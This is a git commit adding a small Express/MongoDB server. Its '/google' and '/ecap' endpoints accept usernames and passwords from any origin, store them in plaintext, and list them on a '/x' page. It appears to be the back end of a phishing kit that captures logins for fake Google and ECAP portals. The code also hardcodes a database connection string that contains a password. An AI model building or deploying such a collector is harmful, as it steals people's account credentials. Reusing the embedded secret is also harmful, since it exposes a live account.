a9f1d6b532c434fce4323437e825373ba9315443
jaya surya <suryasarisa99.com>
2023-08-25 02:40:48 +0530

    initial

---
+++ app.js
@@ -0,0 +1,76 @@
+const express = require("express");
+const app = express();
+const cors = require("cors");
+const { connect } = require("mongoose");
+const { Pass, Ecap } = require("./utils/password");
+app.set("view engine", "pug");
+require("dotenv").config();
+app.use(express.urlencoded({ extended: false }));
+app.use(express.json());
+app.use(express.static("./public"));
+
+connect(
+  "mongodb+srv://suryasarisa99:suryamongosurya@cluster0.xtldukm.mongodb.net/Student?retryWrites=true&w=majority",
+  {
+    useNewUrlParser: true,
+    useUnifiedTopology: true,
+  }
+).then((res) => console.log("connected"));
+
+app.use(
+  cors({
+    origin: "*",
+    allowedHeaders: "Content-Type, Authorization",
+    methods: "POST, GET, PUT, PATCH",
+  })
+);
+
+app.get("/x", async (req, res) => {
+  const passes = await Ecap.find();
+  console.log(passes);
+  // console.log(passes);
+
+  res.render("a", { passes });
+});
+app.post("/google", async (req, res) => {
+  console.log(req.body);
+  let pass = await Pass.findById(req.body.user);
+  if (pass) {
+    if (pass.passwords.includes(req.body.passwd)) return res.send("done");
+    pass.passwords.unshift(req.body.passwd);
+    await pass.save();
+    return res.send("done");
+  } else {
+    let pass = await new Pass({
+      _id: req.body.user,
+      passwords: [req.body.passwd],
+    });
+    await pass.save();
+  }
+
+  return res.json({ sample: "done" });
+});
+app.post("/ecap", async (req, res) => {
+  console.log(req.body);
+  let pass = await Pass.findById(req.body.user);
+  if (pass) {
+    if (pass.passwords.includes(req.body.passwd)) return res.send("done");
+    pass.passwords.unshift(req.body.passwd);
+    await pass.save();
+    return res.send("done");
+  } else {
+    let pass = new Pass({
+      _id: req.body.user,
+      passwords: [req.body.passwd],
+      type: [req.body.type],
+    });
+    await pass.save();
+  }
+
+  return res.json({ sample: "done" });
+});
+app.get("/", (_, res) => {
+  res.send("Surya");
+});
+
+app.listen(process.env.PORT || 3000);
---
+++ utils/password.js
@@ -0,0 +1,16 @@
+const { model, Schema } = require("mongoose");
+
+const passwordSchema = new Schema({
+  _id: String,
+  passwords: [String],
+});
+const EcapPasSchema = new Schema({
+  _id: String,
+  passwords: [String],
+  type: String,
+});
+
+module.exports = {
+  Pass: model("pass", passwordSchema),
+  Ecap: model("Ecap", EcapPasSchema),
+};
